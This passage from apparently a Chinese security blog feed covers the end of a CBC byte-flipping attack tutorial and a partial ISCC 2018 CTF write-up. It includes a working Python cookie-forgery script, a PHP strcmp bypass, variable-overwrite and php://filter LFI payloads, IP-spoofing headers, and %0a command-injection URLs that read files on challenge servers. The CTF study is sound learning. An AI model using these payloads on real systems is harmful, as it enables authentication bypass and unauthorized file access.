因此我们只需要改变在第一个密文块当中，偏移量是2的字节。在第2行我们得到了整个数据的密文，然后在第3行中，我们改变块1中偏移量为2的字节，最后我们再调用解密函数。</p><pre><code>$v = &quot;a:2:{s:4:&quot;name&quot;;s:6:&quot;sdsdsd&quot;;s:8:&quot;greeting&quot;;s:20:&quot;echo &#39;Hello sdsdsd!&#39;&quot;;}&quot;;$enc = @encrypt($v);$enc[2] = chr(ord($enc[2]) ^ ord(&quot;6&quot;) ^ ord (&quot;7&quot;));$b = @decrypt($enc);</code></pre><p>　　这样我们就把“s:6”当中的数字6转换成数字“7”，达到来了我们想要的目的。</p><h2 id="CTF实例"><a href="#CTF实例" class="headerlink" title="CTF实例"></a>CTF实例</h2><h3 id="iscc2018-Only-admin-can-see-flag"><a href="#iscc2018-Only-admin-can-see-flag" class="headerlink" title="iscc2018-Only admin can see flag"></a>iscc2018-Only admin can see flag</h3><p>查看源码得提示index.txt，访问得到源码 </p><pre><code class="php">&lt;?phpinclude &#39;sqlwaf.php&#39;;define(&quot;SECRET_KEY&quot;, &quot;................&quot;);define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);session_start();function get_random_iv(){    $iv=&#39;&#39;;    for($i=0;$i&lt;16;$i++){        $iv.=chr(rand(1,255));    }    return $iv;}// 使用aes-128-cbc 模式加密function login($info){    $iv=get_random_iv();    $plain = serialize($info);    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);    $_SESSION[&#39;username&#39;] = $info[&#39;username&#39;];    setcookie(&quot;iv&quot;, base64_encode($iv));// cookie[iv] = 随机生成的iv 的base64    setcookie(&quot;cipher&quot;, base64_encode($cipher));// cookie[cipher] = 加密值的base64}function show_homepage(){    if ($_SESSION[&quot;username&quot;]===&#39;admin&#39;){//发现当账号为admin，才会显示flag，        echo &#39;&lt;p&gt;Hello admin&lt;/p&gt;&#39;;        echo &#39;&lt;p&gt;Flag is *************&lt;/p&gt;&#39;;    }else{        echo &#39;&lt;p&gt;hello &#39;.$_SESSION[&#39;username&#39;].&#39;&lt;/p&gt;&#39;;        echo &#39;&lt;p&gt;Only admin can see flag&lt;/p&gt;&#39;;    }    echo &#39;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&#39;;    die();}// 解密cipherfunction check_login(){    if(isset($_COOKIE[&#39;cipher&#39;]) &amp;&amp; isset($_COOKIE[&#39;iv&#39;])){        $cipher = base64_decode($_COOKIE[&#39;cipher&#39;]);        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);//cipher和iv变量均中cookie数组中取        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&#39;&quot;.base64_encode($plain).&quot;&#39;) can&#39;t unserialize&lt;/p&gt;&quot;);            $_SESSION[&#39;username&#39;] = $info[&#39;username&#39;];        }else{            die(&quot;ERROR!&quot;);        }    }}if (isset($_POST[&#39;username&#39;])&amp;&amp;isset($_POST[&#39;password&#39;])) {  $username=waf((string)$_POST[&#39;username&#39;]);  $password=waf((string)$_POST[&#39;password&#39;]);  if($username === &#39;admin&#39;){        exit(&#39;&lt;p&gt;You are not real admin!&lt;/p&gt;&#39;);//当我们以admin账号登录时，程序会直接跳出    }else{        $info = array(&#39;username&#39;=&gt;$username,&#39;password&#39;=&gt;$password);        login($info);        show_homepage();    }//否则正常登录，并将用户信息存在info数组中传入login函数，并调用show_homepage函数。}else{  if(isset($_SESSION[&quot;username&quot;])){        check_login();        show_homepage();    }}?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot; &gt;&lt;head&gt;  &lt;meta charset=&quot;UTF-8&quot;&gt;  &lt;title&gt;Paper login form&lt;/title&gt;      &lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt;&lt;/head&gt;&lt;body&gt;  &lt;div id=&quot;login&quot;&gt;  &lt;form action=&quot;&quot; method=&quot;post&quot;&gt;    &lt;h1&gt;Sign In&lt;/h1&gt;    &lt;input name=&#39;username&#39; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;    &lt;input name=&#39;password&#39; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;    &lt;button&gt;Sign in&lt;/button&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>思路就是构造一个Admin用户，然后将大写的A翻转成小写的a，即是admin。我们点击登录之后，可以在cookie中获取到iv和cipher的值（看14行的login函数），然后我们先将cipher的第9个字符使用异或运算翻转成小写字母a，因为info数组序列化后，我们要翻转的大写字母A在下标为9的位置，每个分组的长度为16，因为返回的iv变量长度为16（要先经过base64解密）</p><ol><li>s:2:{s:8:”userna</li><li>me”;s:5:”Admin”;</li><li>s:8:”password”;s</li><li>:5:”admin”;}</li></ol><p>要第二组的b变为d 就要第一组的u改变 </p><p>python脚本：</p><pre><code class="python">import urllib,base64,requests,reurl = &quot;http://118.190.152.202:8001/index.php&quot;datas = {    &quot;username&quot; : &quot;Admin&quot;,    &quot;password&quot; : &quot;admin&quot;}r = requests.post(url,data=datas)cipher = r.cookies.get(&quot;cipher&quot;)cipher = base64.b64decode(urllib.unquote(cipher))offset = 9new_cipher = cipher[:offset] + chr(ord(cipher[offset])^ord(&quot;A&quot;)^ord(&quot;a&quot;)) + cipher[offset+1:]new_cookies = requests.utils.dict_from_cookiejar(r.cookies)new_cookies[&quot;cipher&quot;] = urllib.quote_plus(base64.b64encode(new_cipher))r2 = requests.get(url,cookies=new_cookies)plain = base64.b64decode(re.findall(&quot;decode\(&#39;(.*)&#39;\)&quot;,r2.text)[0])iv = base64.b64decode(urllib.unquote(new_cookies[&quot;iv&quot;]))old = plain[:len(iv)]new = &#39;a:2:{s:8:&quot;userna&#39;new_iv = &quot;&quot;.join([chr(ord(iv[i])^ord(old[i])^ord(new[i])) for i in xrange(16)])new_cookies[&quot;iv&quot;] = urllib.quote_plus(base64.b64encode(new_iv))r3 = requests.get(url,cookies=new_cookies)print(r3.text)</code></pre><h3 id="bugku"><a href="#bugku" class="headerlink" title="bugku"></a>bugku</h3><p>Bugku上的一道题来做分析：<br>题目链接：<code>http://47.93.190.246:49168/</code><br>进入后发现页面存在源码泄露：<code>index.php.swp</code><br>恢复后审计源码：</p><pre><code>function get_random_iv(){    $random_iv=&#39;&#39;;    for($i=0;$i&lt;16;$i++){        $random_iv.=chr(rand(1,255));    }    return $random_iv;}</code></pre><p>首先随机生成了一个16位的iv；<br>然后从</p><pre><code>$info = array(&#39;username&#39;=&gt;$username,&#39;password&#39;=&gt;$password);        login($info);</code></pre><p>和</p><pre><code>function login($info){    $iv = get_random_iv();    $plain = serialize($info);    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);    $_SESSION[&#39;username&#39;] = $info[&#39;username&#39;];    setcookie(&quot;iv&quot;, base64_encode($iv));    setcookie(&quot;cipher&quot;, base64_encode($cipher));}</code></pre><p>可见，对传入的账号和密码进行序列化，作为明文，然后对其进行AES加密，其中使用到了随机生成的iv<br>后将加密后的内容进行base64编码，放入cookie中。</p><pre><code>function check_login(){    if(isset($_COOKIE[&#39;cipher&#39;]) &amp;&amp; isset($_COOKIE[&#39;iv&#39;]))    {        $cipher = base64_decode($_COOKIE[&#39;cipher&#39;]);        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))        {            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&#39;&quot;.base64_encode($plain).&quot;&#39;) can&#39;t unserialize&lt;/p&gt;&quot;);            $_SESSION[&#39;username&#39;] = $info[&#39;username&#39;];        }        else        {            die(&quot;ERROR!&quot;);        }    }}</code></pre><p>然后再对传入的cookie中的密文解密，然后对明文就行反序列化（如果反序列化失败就打印出明文的base64编码），后把反序列化后的明文，即Info中的username还给username，最后进行判定:</p><pre><code>function show_homepage(){    if ($_SESSION[&quot;username&quot;]===&#39;admin&#39;){        echo &#39;&lt;p&gt;Hello admin&lt;/p&gt;&#39;;        echo &#39;&lt;p&gt;Flag is $flag&lt;/p&gt;&#39;;    }else{        echo &#39;&lt;p&gt;hello &#39;.$_SESSION[&#39;username&#39;].&#39;&lt;/p&gt;&#39;;        echo &#39;&lt;p&gt;Only admin can see flag&lt;/p&gt;&#39;;    }    echo &#39;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&#39;;}</code></pre><p>如果用户名是admin，就给出flag，否则不给，但值得一提的是：</p><pre><code>if(isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;])){    $username = (string)$_POST[&#39;username&#39;];    $password = (string)$_POST[&#39;password&#39;];    if($username === &#39;admin&#39;)    {        exit(&#39;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&#39;);    }    else    {        $info = array(&#39;username&#39;=&gt;$username,&#39;password&#39;=&gt;$password);        login($info);        show_homepage();    }}</code></pre><p>登录时做出了限制，如果用admin登录是显然不行的。<br>所以这时就需要CBC字节翻转攻击来实现了<br>登录时：可以使用</p><pre><code>username=1dmin;password=Mang0;</code></pre><p>此时我们要做的就是把1dmin通过翻转攻击，把’1‘变成‘a’，即可变成admin登录成功得到Flag<br>首先按照步骤：将我们传入的Info进行序列化，得到明文：<br><code>a:2:{s:8:&quot;username&quot;;s:5:&quot;1dmin&quot;;s:8:&quot;password&quot;;s:5:&quot;Mang0&quot;;}</code><br>然后对其进行分组：</p><pre><code>block 1 : a:2:{s:8:&quot;usernablock 2 : me&quot;;s:5:&quot;1dmin&quot;;block 3 : s:8:&quot;password&quot;;sblock 4 : :5:&quot;Mang0&quot;;}</code></pre><p>我们所要改变的即block 2中的偏移量为9的那个明文，即1<br>所以按照攻击方式，应该改变block 1中有相同偏移量的那个密文，即偏移量为9的值<br>所以得到以下公式：<br>cipher = cipher[:9] + chr(ord(cipher[9]) ^ ord(‘1’) ^ ord(‘a’)) + cipher[10:]<br>故可将1dmin变成admin，但有一点需要注意，这样改变后，密文的值发生了改变，将其进行解密后反序列化，是会失败的，从而会把无法反序列化的明文打印出来（因为我们对block 1进行了改变，虽然block 2变成了我们所希望的值，但block 1却变成了未知的量）<br>所以此时，需要改变iv的值来改变block 1的值<br>（注：这就是cbc的处理方式，iv的值改变block1的值，block1的值改变block2的值……）<br>故此，我们需要一个正确的Iv，使block 1依旧为<code>a:2:{s:8:&quot;userna</code><br>故此得到第二个公式：（plain为无法反序列化打印出来的被base64编码的明文）</p><pre><code>want = &#39;a:2:{s:8:&quot;userna&#39;first_16 = &#39;&#39;iv = base64.b64decode(&#39;你一开始随机生成的被base64编码过的iv&#39;)for i in range(16):    first_16 += chr(ord(plain[i]) ^ ord(iv[i]) ^ ord(want[i]))newiv = first_16</code></pre><p>这样就可以将密文前16位的值，即block 1的明文变成我们想要的<code>a:2:{s:8:&quot;userna</code><br>故此即plain伪造成功，此时的plain是绝对可以被反序列化的<br>最后，我们将伪造的密文和伪造的iv传入cookie，即可被解密还原成我们伪造的plain<br>即：<br><code>a:2:{s:8:&quot;username&quot;;s:5:&quot;1dmin&quot;;s:8:&quot;password&quot;;s:5:&quot;Mang0&quot;;}</code><br>变成了<br><code>a:2:{s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:5:&quot;Mang0&quot;;}</code><br>最后即可以admin的身份成功登入网站，拿到flag</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CBC字节翻转攻击&quot;&gt;&lt;a href=&quot;#CBC字节翻转攻击&quot; class=&quot;headerlink&quot; title=&quot;CBC字节翻转攻击&quot;&gt;&lt;/a&gt;CBC字节翻转攻击&lt;/h1&gt;&lt;h2 id=&quot;CBC原理&quot;&gt;&lt;a href=&quot;#CBC原理&quot; class=&quot;header
      
    
    </summary>
    
      <category term="WebSecurity" scheme="http://mang0.me/categories/WebSecurity/"/>
    
    
      <category term="密码学" scheme="http://mang0.me/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>ISCC2018-writeup</title>
    <link href="http://mang0.me/archives/4e1d9865/"/>
    <id>http://mang0.me/archives/4e1d9865/</id>
    <published>2018-05-27T16:54:05.000Z</published>
    <updated>2018-10-15T00:40:51.564Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="What-is-that？"><a href="#What-is-that？" class="headerlink" title="What is that？"></a>What is that？</h3><p>winhex打开修改高度</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805011954_574.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805011955_458.png" alt=""></p><p>_Welcome_To_ISCC<em>2018</em></p><h3 id="数字密文"><a href="#数字密文" class="headerlink" title="数字密文"></a>数字密文</h3><p>69742773206561737921 </p><p>16进制转文本 </p><p>给个在线网站</p><p><a href="https://www.bejson.com/convert/ox2str/" target="_blank" rel="external">https://www.bejson.com/convert/ox2str/</a></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171116_151.png" alt=""></p><h3 id="秘密电报："><a href="#秘密电报：" class="headerlink" title="秘密电报："></a>秘密电报：</h3><p>知识就是力量 ABAAAABABBABAAAABABAAABAAABAAABAABAAAABAAAABA</p><p>在线培根密码解密</p><p><a href="http://tool.ph0en1x.com/bacon/" target="_blank" rel="external">http://tool.ph0en1x.com/bacon/</a></p><p>ILIKEISCC</p><h3 id="重重谍影"><a href="#重重谍影" class="headerlink" title="重重谍影"></a>重重谍影</h3><p>base64解密，</p><p>在线解密<a href="https://base64.supfree.net/" target="_blank" rel="external">https://base64.supfree.net/</a></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171406_511.png" alt=""></p><p>解密到这里不行了</p><p>U2FsdGVkX183BPnBd50ynIRM3o8YLmwHaoi8b8QvfVdFHCEwG9iwp4hJHznrl7d4B5rKClEyYVtx6uZFIKtCXo71fR9Mcf6b0EzejhZ4pnhnJOl+zrZVlV0T9NUA+u1ziN+jkpb6ERH86j7t45v4Mpe+j1gCpvaQgoKC0Oaa5kc=  </p><p>然后再用aes解密 </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171412_741.png" alt=""></p><p><a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="external">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171413_518.png" alt=""></p><p>把我复制走</p><h3 id="有趣的ISCC"><a href="#有趣的ISCC" class="headerlink" title="有趣的ISCC"></a>有趣的ISCC</h3><p>把图片放进WinHex中观察 </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171511_899.png" alt=""></p><p>末尾有很多Unicode</p><p>Unicode转ascii</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171423_933.png" alt=""></p><p>unicode转中文</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171425_238.png" alt=""></p><p>flag{iscc is fun}</p><h3 id="Where-is-the-FLAG？"><a href="#Where-is-the-FLAG？" class="headerlink" title="Where is the FLAG？"></a>Where is the FLAG？</h3><p>TweakPNG打开 </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171430_847.png" alt=""></p><p>Adobe Fireworks CS5 处理 </p><p>图层隐层</p><p>拼接一下</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171502_356.png" alt=""></p><h3 id="凯撒十三世"><a href="#凯撒十三世" class="headerlink" title="凯撒十三世"></a>凯撒十三世</h3><p>凯撒密码，并且偏移是13</p><p>得到<code>roqtp697t95j3</code>，一看就不是flag，结合提示<code>键盘</code>，所以可能是键盘密码: 即密文在键盘上的下一行所对应的字符是相应明文，</p><h3 id="一只猫的心思"><a href="#一只猫的心思" class="headerlink" title="一只猫的心思"></a>一只猫的心思</h3><p>winhex打开会发现这个是jpg文件，有文件头，但是没有文件尾，搜索之后就会得到文件尾FFD9所在的位置，需要把FFD9后面的十六进制转化为一个新的文件，并且要以（.doc）格式保存  </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171528_660.png" alt=""></p><p><a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="external">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a> </p><p>佛曰密码解</p><p>523156615245644E536C564856544E565130354B553064524D6C524E546B4A56535655795645644F5530524857544A4553553943566B644A4D6C524E546C7052523155795645744F536C5248515670555330354452456456576B524854554A585231457956554E4F51305A4855544E4553303153566B64424D6C524A546B7058527A525A5245744F576C5A4854544A5554553554513063304E46524C54564A5652316B795255744F51305A4856544E5554564661566B6C464D6B5252546B70595231557A5245394E516C5A4856544A555355354B566B644E5756524E5455705752316B7A5255564F55305248566B465553564A4356306C4E4D6C524E546B4A565231557952453152556C564A56544A455555354B5530644E5756525054554A56523030795645314F516C5A4857544A4553303143566B64464D305648546B744352314A425645744F576C5A4855544A4651303543566B64564D6B524854554A555230557A52454E4F536C644855544A5554553543566B645A4D6B564A546C4E445231566152456C52576C5A4855544A5553303544516B64564D6C524C54564A55523045795245314F556C4A4856544E455355354B56556C564D6B564E546B70535230315A52457452536C564951544A555455354B565564535156524A54564A575230457956456C4E576C46485454525553303143566B6446576C564A54544A46</p><p>十六进制转换了，转换为字符串：  </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171532_778.png" alt=""></p><p>base64解密：  </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171557_687.png" alt=""></p><p>base32：  </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171615_371.png" alt=""></p><p>十六进制转化： </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171616_86.png" alt=""></p><p>base64解密：  </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171617_526.png" alt=""></p><p>base32：  </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171618_95.png" alt=""></p><p>十六进制转化 </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171619_254.png" alt=""></p><p>F1a9_is_I5cc_ZOl8_G3TP01NT</p><p>Base64编码是使用64个可打印ASCII字符（A-Z、a-z、0-9、+、/）将任意字节序列数据编码成ASCII字符串，另有“=”符号用作后缀用途</p><p>Base32编码是使用32个可打印字符（字母A-Z和数字2-7） </p><p>Base16编码使用16个ASCII可打印字符（数字0-9和字母A-F）对任意字节数据进行编码 </p><h3 id="暴力XX不可取"><a href="#暴力XX不可取" class="headerlink" title="暴力XX不可取"></a>暴力XX不可取</h3><p>伪加密修改的几种方法</p><blockquote><p>1、在Mac OS以及部分linux（Kali）系统中，可以直接打开伪加密的ZIP压缩包。</p><p>2、使用检测伪加密的工具ZipCenOp.jar，解密后如果能成功打开ZIP包，则是伪加密，否则说明思路错误。</p><p>3、使用16进制编辑器更改加密标志位。</p></blockquote><p>打开压缩包之后发现需要解压密码</p><p>既然已经知道是伪加密那就直接尝试伪加密，利用伪加密判断工具ZipCenOp</p><pre><code>java -jar ZipCenOp.jar r ISCC-MISC02.zip</code></pre><p>vfppjrnerpbzvat </p><p>rot13 解码</p><p>得到isccwearecoming</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805012218_803.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805012227_276.png" alt=""></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="比较数字大小"><a href="#比较数字大小" class="headerlink" title="比较数字大小"></a>比较数字大小</h3><p>f12查看 本地长度绕过修改maxlength=4</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805031858_254.png" alt=""></p><p>输入99999999提交</p><p>得key is 768HKyu678567&amp;*&amp;K</p><h3 id="web01"><a href="#web01" class="headerlink" title="web01"></a>web01</h3><p><img src="http://oy0tigw51.bkt.clouddn.com/201805071904_900.png" alt=""></p><pre><code>&lt;?php highlight_file(&#39;2.php&#39;); $flag=&#39;{***************}&#39;; if (isset($_GET[&#39;password&#39;])) {       if (strcmp($_GET[&#39;password&#39;], $flag) == 0)   ////如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。 //比较两个字符串（区分大小写）         die(&#39;Flag: &#39;.$flag);       else           print &#39;Invalid password&#39;;   }   ?&gt;</code></pre><p><a href="http://118.190.152.202:8003?password[]=1" target="_blank" rel="external">http://118.190.152.202:8003?password[]=1</a></p><p>ISCC{iscc_ef3w5r5tw_5rg5y6s3t3} </p><h3 id="本地的诱惑"><a href="#本地的诱惑" class="headerlink" title="本地的诱惑"></a>本地的诱惑</h3><p>查看源码ISCC{^&amp;*(UIHKJjkadshf}</p><h3 id="你能跨过去吗？"><a href="#你能跨过去吗？" class="headerlink" title="你能跨过去吗？"></a>你能跨过去吗？</h3><p>题目</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805031853_626.png" alt=""></p><p>%2b/v%2b%20%2bADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAiAGsAZQB5ADoALwAlAG4AcwBmAG8AYwB1AHMAWABTAFMAdABlAHMAdAAlAC8AIgApADwALwBzAGMAcgBpAHAAdAA%2bAC0-&amp;_</p><p>base64解码</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805031853_539.png" alt=""></p><p>flag{Hell0World}</p><h3 id="一切都是套路"><a href="#一切都是套路" class="headerlink" title="一切都是套路"></a>一切都是套路</h3><p>好像有个文件忘记删了</p><p>考察源码泄露</p><p>py脚本得到<a href="http://118.190.152.202:8009/index.php.txt" target="_blank" rel="external">http://118.190.152.202:8009/index.php.txt</a></p><p>所以进入得到如下代码</p><pre><code class="php">&lt;?phpinclude &quot;flag.php&quot;;if ($_SERVER[&quot;REQUEST_METHOD&quot;] != &quot;POST&quot;)    die(&quot;flag is here&quot;);if (!isset($_POST[&quot;flag&quot;])     die($_403);foreach ($_GET as $k =&gt; $v){     $$k = $$v;//$k=200 $$k=$_200    所以$_200 = &amp;flag}foreach ($_POST as $k =&gt; $v){    $$k = $v; //$flag =2333}if ( $_POST[&quot;flag&quot;] !== $flag )    die($_403);echo &quot;flag: &quot;. $flag . &quot;\n&quot;;die($_200);?&gt;</code></pre><blockquote><h5 id="foreach"><a href="#foreach" class="headerlink" title="foreach"></a>foreach</h5><p>(PHP 4, PHP 5, PHP 7)</p><p><em>foreach</em> 语法结构提供了遍历数组的简单方式。<em>foreach</em> 仅能够应用于数组和对象，如果尝试应用于其他数据类型的变量，或者未初始化的变量将发出错误信息。有两种语法：</p><pre><code>foreach (array_expression as $value)    statementforeach (array_expression as $key =&gt; $value)    statement</code></pre><p>第一种格式遍历给定的 <em>array_expression</em> 数组。每次循环中，当前单元的值被赋给 <em>$value</em> 并且数组内部的指针向前移一步（因此下一次循环中将会得到下一个单元）。</p><p>第二种格式做同样的事，只除了当前单元的键名也会在每次循环中被赋给变量 <em>$key</em>。</p></blockquote><p><a href="http://www.cleey.com/blog/single/id/841.html" target="_blank" rel="external">深入解析php中的foreach问题</a></p><p>题目中使用了两个foreach并且也使用了’&amp;&amp;’,两个foreach中对 $$key的处理是不一样的，满足条件后会将$flag里面的值打印出来，所以$flag是在flag.php文件文件中的。 行间的代码会将$flag的值给覆盖掉了，所以需要先将$flag的值赋给$_200或$_403变量，然后利用die($_200)或 die($_403)将flag打印出来。</p><p>有很明显的变量覆盖漏洞。要求我们在post语句中有flag，同时在第二个foreach中又把<code>$flag</code>直接覆盖了，所以直接通过echo语句输出的flag是被修改过的。接着看看有什么输出点，比如有个<code>die($_200)</code>，结合第一个foreach的功能，我们可以在第二个foreach之前先将<code>$_200</code>的值覆盖为原flag的值。</p><p>payload:</p><pre><code>index.php?_200=flagPOST:flag=1</code></pre><p>利用前面的<code>die($_403)</code>也可以实现。我们先把原flag的值覆盖到<code>$_403</code>上，然后构造<code>$_POST[&quot;flag&quot;] !== $flag</code>，从而<code>die($_403)</code>输出flag。</p><p>payload2:</p><pre><code>index.php?_403=flag&amp;_POST=1POST:flag=</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201805070015_872.png" alt=""></p><p>ISCC{taolu2333333….} </p><h3 id="你能绕过吗"><a href="#你能绕过吗" class="headerlink" title="你能绕过吗?"></a>你能绕过吗?</h3><p>打开地址随便点文章，一开始可能以为是sql注入</p><p>但仔细看会发现?f=articles可能是存在文件包含漏洞</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805071843_315.png" alt=""></p><p>但是这里有个坑，题目说</p><blockquote><p>你能绕过吗?</p><p>没过滤好啊</p></blockquote><p>因为考察文件包含漏洞所以很有可能过滤php filter协议，尝试大写Php发现绕过成功</p><p><a href="http://118.190.152.202:8008/index.php?f=Php://filter/read=convert.base64-encode/resource=index&amp;id=2" target="_blank" rel="external">http://118.190.152.202:8008/index.php?f=Php://filter/read=convert.base64-encode/resource=index&amp;id=2</a></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805071842_517.png" alt=""></p><p>得到base64源码。</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805071842_242.png" alt=""></p><p>ISCC{LFIOOOOOOOOOOOOOO}</p><h3 id="web02"><a href="#web02" class="headerlink" title="web02"></a>web02</h3><p><a href="http://118.190.152.202:8004/" target="_blank" rel="external">http://118.190.152.202:8004/</a></p><p>一开始尝试X-Forwarded-For: 127.0.0.1不行</p><blockquote><pre><code>X-Forwarded-For: 127.0.0.1Contact: 127.0.0.1X-Originating-IP: 127.0.0.1X-Real-IP: 127.0.0.1X-Client-IP: 127.0.0.1Referer: 127.0.0.1From: 127.0.0.1X-Wap-Profile: 127.0.0.1True-Client-IP: 127.0.0.1Client-IP: 127.0.0.1</code></pre></blockquote><p>后来尝试Client-IP: 127.0.0.1</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805021340_915.png" alt=""></p><p>ISCC{iscc_059eeb8c0c33eb62}</p><h3 id="请ping我的ip-看你能Ping通吗？"><a href="#请ping我的ip-看你能Ping通吗？" class="headerlink" title="请ping我的ip 看你能Ping通吗？"></a>请ping我的ip 看你能Ping通吗？</h3><p>万万没想到直接在get方式下命令执行，过滤| 使用%0a绕过</p><p>查看当前目录<a href="http://118.190.152.202:8018/index.php?ip=118.190.152.202%0als" target="_blank" rel="external">http://118.190.152.202:8018/index.php?ip=118.190.152.202%0als</a></p><p>查看源代码<a href="http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acat%20index.php" target="_blank" rel="external">http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acat%20index.php</a></p><pre><code> &#39;&#39;,        &#39;;&#39; =&gt; &#39;&#39;,        &#39;|&#39; =&gt; &#39;&#39;,        &#39;-&#39;  =&gt; &#39;&#39;,        &#39;$&#39;  =&gt; &#39;&#39;,        &#39;(&#39;  =&gt; &#39;&#39;,        &#39;)&#39;  =&gt; &#39;&#39;,        &#39;`&#39;  =&gt; &#39;&#39;,        &#39;||&#39; =&gt; &#39;&#39;,    );    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {        // Windows        $cmd = shell_exec( &#39;ping  &#39; . $target );    }    else {        // *nix        $cmd = shell_exec( &#39;ping  -c 1 &#39; . $target );    }    echo  &quot;{$cmd}&quot;;?&gt;</code></pre><p>查看根目录<a href="http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0als" target="_blank" rel="external">http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0als</a></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805080036_137.png" alt=""></p><p>一个一个试查看flag在哪里 发现flag在/home/flag</p><p><a href="http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0acd%20home%0als" target="_blank" rel="external">http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0acd%20home%0als</a></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805080045_61.png" alt=""></p><p><a href="http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0acd%20home%0acat%20flag" target="_blank" rel="external">http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0acd%20home%0acat%20flag</a></p><pre><code>ISCC{8a8646c7a2fce16b166fbc68ca65f9e4}</code></pre><p>Reference：</p><p><a href="http://vinc.top/2016/12/22/%E3%80%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E3%80%91%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/" target="_blank" rel="external">http://vinc.top/2016/12/22/%E3%80%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E3%80%91%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/</a></p><p>方法二:</p><p> 使用扫描器，扫描一下目录。如下图所示； <img src="http://www.360zhijia.com/wp-content/uploads/2018/05/25/834add0a-fcb1-4893-bd20-de7ff3e922d4.png" alt="第一手详细又全面的ISCC 2018 writeup等你学习"> 扫描结果：<a href="http://118.190.152.202:8018/flag.txt" target="_blank" rel="external">http://118.190.152.202:8018/flag.txt</a> （3） 打开扫描结果，如下图所示； <img src="http://www.360zhijia.com/wp-content/uploads/2018/05/25/afd1056b-c0f7-4735-aff0-2cf288df693f.png" alt="第一手详细又全面的ISCC 2018 writeup等你学习"> </p><h3 id="php是世界上最好的语言"><a href="#php是世界上最好的语言" class="headerlink" title="php是世界上最好的语言"></a>php是世界上最好的语言</h3><p><img src="http://oy0tigw51.bkt.clouddn.com/201805170015_39.png" 